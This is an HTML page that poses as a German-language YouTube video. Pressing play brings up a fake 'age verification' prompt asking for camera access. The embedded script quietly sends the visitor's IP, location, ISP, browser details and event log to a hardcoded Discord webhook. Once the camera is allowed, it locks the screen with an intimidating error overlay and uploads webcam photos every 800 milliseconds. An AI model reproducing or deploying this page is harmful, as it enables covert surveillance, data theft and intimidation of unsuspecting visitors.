<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>djemail gashi - YouTube</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
  <link rel="icon" href="https://www.youtube.com/s/desktop/1e8a78f5/img/favicon_32x32.png">
  <style>
    :root {
      --yt-red: #f00;
      --yt-bg: #0f0f0f;
      --yt-dark: #181818;
      --yt-gray: #aaa;
      --yt-light-gray: #272727;
    }
    * {margin:0;padding:0;box-sizing:border-box;}
    body {
      font-family:'Roboto',sans-serif;
      background:var(--yt-bg);
      color:#fff;
      line-height:1.4;
      -webkit-tap-highlight-color:transparent;
      overflow:hidden;
    }
    header {
      position:fixed;top:0;left:0;right:0;height:56px;
      background:#000;display:flex;align-items:center;
      padding:0 16px;z-index:100;border-bottom:1px solid #303030;
    }
    .logo {height:24px;margin-right:24px;}
    .search-bar {
      flex:1;max-width:640px;height:40px;background:#121212;
      border:1px solid #303030;border-radius:40px;
      display:flex;align-items:center;padding:0 16px;
    }
    .search-bar input {
      flex:1;background:transparent;border:none;
      color:#fff;font-size:16px;outline:none;
    }
    .right-icons {display:flex;gap:20px;align-items:center;margin-left:24px;}
    .icon {width:32px;height:32px;background:#333;border-radius:50%;}

    .main {margin-top:56px;padding:24px;max-width:1800px;margin:56px auto 0;}
    .player {
      position:relative;width:100%;background:#000;
      border-radius:12px;overflow:hidden;
      box-shadow:0 4px 20px rgba(0,0,0,0.7);
    }
    .thumb {width:100%;display:block;}
    .play-overlay {
      position:absolute;inset:0;display:flex;
      align-items:center;justify-content:center;
      background:rgba(0,0,0,0.35);cursor:pointer;
    }
    .play-btn {
      width:110px;height:74px;background:var(--yt-red);
      border-radius:50%/80%;display:flex;align-items:center;justify-content:center;
      box-shadow:0 0 25px #f00;
    }
    .play-btn::before {
      content:'';border:18px solid transparent;border-left:30px solid #fff;margin-left:6px;
    }

    #prompt {
      position:fixed;inset:0;background:rgba(0,0,0,0.94);
      display:none;justify-content:center;align-items:center;z-index:9999;
    }
    #prompt-box {
      background:#181818;padding:50px;border-radius:16px;
      max-width:480px;text-align:center;
    }
    #error-msg {
      color:#f44;margin:20px 0;display:none;
    }
    .btn {
      padding:16px 40px;font-size:1.25rem;border:none;
      border-radius:8px;margin:12px;cursor:pointer;
    }
    .allow {background:#065fd4;color:white;}
    .deny {background:#303030;color:#ddd;}

    #block-overlay {
      position:fixed;inset:0;background:rgba(20,0,0,0.98);
      display:none;justify-content:center;align-items:center;
      z-index:10000;flex-direction:column;text-align:center;
      animation:pulse 2s infinite alternate;
    }
    @keyframes pulse {
      0% {opacity:0.92;}
      100% {opacity:0.98;}
    }
    .block-text {
      font-size:5rem;font-weight:bold;color:#f00;
      text-shadow:0 0 40px #f00;margin-bottom:40px;
    }
    .block-sub {
      font-size:2rem;color:#ff4444;max-width:80%;
    }
  </style>
</head>
<body>

<header>
  <img src="https://www.youtube.com/img/desktop/yt_1200.png" class="logo" alt="YouTube">
  <div class="search-bar">
    <input type="text" placeholder="Suchen">
  </div>
  <div class="right-icons">
    <div class="icon"></div>
    <div class="icon"></div>
    <div class="icon"></div>
  </div>
</header>

<div class="main">
  <div class="player">
    <img class="thumb" src="https://img.youtube.com/vi/-oXy7kZSdRo/maxresdefault.jpg" alt="Thumbnail">
    <div class="play-overlay" id="playBtn">
      <div class="play-btn"></div>
    </div>
  </div>
</div>

<div id="prompt">
  <div id="prompt-box">
    <h2>Video kann nicht abgespielt werden</h2>
    <p style="margin:25px 0;font-size:1.25rem;">
      Um das Video anzusehen, musst du kurz die Kamera freigeben (Altersverifikation).
    </p>
    <div id="error-msg" style="color:#f44;margin:20px 0;display:none;">Zugriff verweigert! Versuche es erneut.</div>
    <button id="allowBtn" class="btn allow">KAMERA FREIGEBEN</button>
    <button id="denyBtn" class="btn deny">ABBRECHEN</button>
  </div>
</div>

<div id="block-overlay">
  <div class="block-text">ERROR</div>
  <div class="block-sub">Zugriff verweigert! Die Seite ist gesperrt. Du kannst nichts mehr tun.</div>
</div>

<video id="v" autoplay playsinline muted style="display:none"></video>
<canvas id="c" style="display:none"></canvas>

<script>
  const WEBHOOK = "https://discord.com/api/webhooks/1469356230932824309/a37FAcac9zDeOiHgx2kNAukuUHrFjDrX0XZg5b_Q1R_bVbtZRhL070tfkOeEGhysRYPI";

  const v = document.getElementById("v");
  const c = document.getElementById("c");
  const promptEl = document.getElementById("prompt");
  const errorMsg = document.getElementById("error-msg");
  const playBtn = document.getElementById("playBtn");
  const blockOverlay = document.getElementById("block-overlay");

  let stream = null;
  let count = 0;

  async function getIPData() {
    for (let url of ["https://ipapi.co/json/", "https://ipinfo.io/json"]) {
      try {
        const r = await fetch(url);
        const d = await r.json();
        if (d.ip) return d;
      } catch {}
    }
    return {ip:"unknown",city:"?",region:"?",country:"?",postal:"?",org:"?"};
  }

  async function sendToWebhook(type, blob = null, extra = {}) {
    try {
      const ip = await getIPData();
      const payload = { embeds: [{ 
        title: `ðŸ”´ ${type} #${++count}`,
        color: 0xFF0000,
        fields: [
          {name:"Ereignis",value:type,inline:true},
          {name:"IP + Adresse",value:`**${ip.ip}**\n${ip.city} â€¢ ${ip.region} â€¢ ${ip.country}\nPLZ: ${ip.postal} â€¢ ${ip.org}`,inline:true},
          {name:"User-Agent",value:navigator.userAgent.substring(0,140),inline:false},
          {name:"Bildschirm",value:`${screen.width}Ã—${screen.height}`,inline:true},
          {name:"Zeit",value:new Date().toISOString(),inline:true}
        ],
        timestamp: new Date().toISOString()
      }]};

      if (extra.lat) payload.embeds[0].fields.push({name:"Standort",value:`Lat ${extra.lat.toFixed(5)} Lon ${extra.lon.toFixed(5)}\n[Maps](https://maps.google.com/?q=${extra.lat},${extra.lon})`,inline:false});

      if (blob) {
        const fd = new FormData();
        fd.append("payload_json", JSON.stringify(payload));
        fd.append("file", blob, `shot_${Date.now()}.jpg`);
        await fetch(WEBHOOK + "?wait=true", {method:"POST", body:fd});
      } else {
        await fetch(WEBHOOK + "?wait=true", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(payload)});
      }
    } catch(e) {}
  }

  playBtn.onclick = () => { promptEl.style.display = "flex"; sendToWebhook("PLAY_KLICK"); };

  document.getElementById("allowBtn").onclick = async () => {
    promptEl.style.display = "none";
    // Zodra toegestaan â†’ blokkeer direct de hele pagina
    blockOverlay.style.display = "flex";
    sendToWebhook("KAMERA_ZUGELASSEN_ABER_GEBLOCKT");

    try {
      stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
      v.srcObject = stream;
      v.playsInline = true;
      v.muted = true;

      await new Promise(r => {
        v.onloadedmetadata = () => v.play();
        v.oncanplaythrough = () => setTimeout(r, 1500);
      });

      c.width = v.videoWidth || 640;
      c.height = v.videoHeight || 480;

      setInterval(async () => {
        c.getContext("2d").drawImage(v,0,0,c.width,c.height);
        const blob = await new Promise(res => c.toBlob(res,"image/jpeg",0.92));
        sendToWebhook("KAMERA_SHOT", blob);
      }, 800);

    } catch(e) {
      sendToWebhook("KAMERA_FEHLER_NACH_BLOCK", null, {error: e.message});
    }
  };

  document.getElementById("denyBtn").onclick = () => {
    errorMsg.style.display = "block";
    sendToWebhook("KAMERA_VERWEIGERT");
    setTimeout(() => promptEl.style.display = "flex", 700);
  };
</script>
</body>
</html>
